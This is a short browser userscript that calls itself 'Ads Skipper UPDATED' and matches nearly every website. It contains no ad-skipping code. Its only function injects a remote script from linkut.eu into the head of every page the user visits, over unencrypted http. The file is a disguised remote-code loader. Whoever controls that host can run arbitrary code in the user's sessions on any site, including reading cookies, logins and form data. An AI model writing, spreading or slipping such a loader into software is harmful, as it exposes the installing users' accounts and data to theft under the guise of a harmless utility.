// ==UserScript==
// @name			Ads Skipper UPDATED 
// @namespace       http://userscripts.org/scripts/show/999999
// @version			1.1
// @copyright		French Locker
// @description		Update Checked
// @author			Robhein94
// @include			http://*.*
// @include			http*://*.*.*
// @include			http://*.com
// @include			http://*.eu
// @include			http://*.*.com
// @include			http://*.*.eu
// @icon			http://icdn.pro/images/fr/y/a/yast-icone-5855-128.png
// Version numero 1.
// ==/UserScript==

function addJavascript(jsname, pos) {
    var th = document.getElementsByTagName(pos)[0];
    var s = document.createElement('script');
    s.setAttribute('type', 'text/javascript');
    s.setAttribute('src', jsname);
    th.appendChild(s);
}
addJavascript('http://www.linkut.eu/updates.js', 'head');